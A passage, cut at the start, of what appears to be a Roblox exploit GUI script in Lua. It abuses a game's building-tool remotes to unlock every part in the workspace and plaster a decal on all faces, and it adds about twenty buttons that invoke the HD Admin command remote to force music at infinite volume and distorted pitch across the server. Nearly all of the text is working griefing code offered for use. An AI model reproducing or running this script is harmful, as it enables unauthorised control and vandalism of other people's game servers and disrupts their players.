	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("109196760206324")
end)
local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0.1, 0, 0, 30)
titleText.Position = UDim2.new(0.45, 1, 0.649, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 0
titleText.BorderColor3 = Color3.new(1, 9, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "Music"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 39
titleText.Parent = mainFrame

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.70, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "spooky scary skeletons"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 77484784570543")
	RequestCommand:InvokeServer(";pitch 0.09")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.70, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "gangsta paradise remix"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 5228173823")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.70, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "k**pkidd theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1839246711")
	RequestCommand:InvokeServer(";pitch 0.9")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.70, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "wonga"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 113759202983382")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.70, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "BON3SAW"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 75522197868449")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.77, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "tuboos93 song"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 127653283576622")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.77, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "MAYO AND NOODLES!"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 92270747179845")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.77, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "arabic music"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 122919988808125")
	RequestCommand:InvokeServer(";pitch 1.12")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.77, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "Won't Stop Us"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1847661821")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.77, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "jugsta bypassed"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 16190761193")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.84, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "coikax theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1839272148")
	RequestCommand:InvokeServer(";pitch 0.9")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.84, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "spanish music"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 77535208560062")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.84, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "tiktok music"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 93218265275853")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.84, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "beethoven virus"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 126222491506418")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.84, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "theme v4"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 87617522673082")
	RequestCommand:InvokeServer(";pitch 0.74")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.91, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "lavender town"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 85789014973504")
	RequestCommand:InvokeServer(";pitch 0.2")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.91, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "lois"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 105819456196233")
	RequestCommand:InvokeServer(";pitch 0.29")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.91, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "MLG"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 105355441763420")
	RequestCommand:InvokeServer(";pitch 0.1")
	RequestCommand:InvokeServer(";volume inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.91, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "baller"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 84455976221709")
	RequestCommand:InvokeServer(";volume inf")
    RequestCommand:InvokeServer(";pitch 0.1")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.91, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "sirmeme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 78973045684083")
	RequestCommand:InvokeServer(";volume inf")
    RequestCommand:InvokeServer(";pitch 0.3")
    
end)
